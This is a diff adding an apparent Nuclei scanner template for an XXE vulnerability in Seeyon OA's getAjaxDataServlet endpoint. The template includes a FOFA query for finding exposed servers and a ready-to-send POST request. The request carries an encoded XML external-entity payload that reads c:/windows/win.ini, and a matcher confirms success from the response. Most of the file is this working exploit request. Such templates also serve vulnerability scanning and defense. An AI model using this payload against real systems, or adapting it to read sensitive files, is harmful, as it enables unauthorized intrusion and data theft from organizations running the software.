@@ -1,0 +1,25 @@
+id: seeyon-getAjaxDataServlet-xxe
+
+info:
+  name: 致远OA getAjaxDataServlet XXE漏洞
+  author: fgz
+  severity: critical
+  description: 致远互联协同运营平台，打造企业数智运营中枢，助力企业实现办公业务、财务、管理与运营的一体化运作，帮助企业加强链接、用好数据做好决策，全面实现数字化。该系统getAjaxDataServlet接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。
+  metadata:
+    max-request: 1
+    fofa-query: app="致远互联-OA"
+    verified: true
+requests:
+  - raw:
+      - |+
+        POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'for 16-bit app')"
